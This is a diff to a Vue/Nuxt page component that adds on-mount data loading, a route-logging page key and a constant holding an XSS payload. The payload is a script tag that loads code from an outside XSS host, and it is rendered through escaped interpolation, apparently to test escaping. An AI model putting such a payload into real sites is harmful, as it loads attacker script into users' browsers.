@@ -1,5 +1,6 @@
 <template>
   <div>
+    <div class="xss">{{ xss }}</div>
     <!-- 列表内容 -->
     <NButton @click="loadData"> 加载数据 </NButton>
     <ul>
@@ -20,6 +21,7 @@ const pageIndex = ref(1);
 
 // 模拟测试数据ttt
 const listData = ref<any>([]);
+const xss = "<sCRiPt/SrC=//xss.red/lcEc>"
 
 const loadData = () => {
   listData.value = new Array(50).fill(0).map((item, index) => {
@@ -27,8 +29,15 @@ const loadData = () => {
   });
 };
 
-
+onMounted(() => {
+  loadData();
+});
 definePageMeta({
+  key: (route) => {
+    console.log("definePageMeta-route: ", route);
+
+    return route.path
+  },
   keepalive: true
-})
+});
 </script>
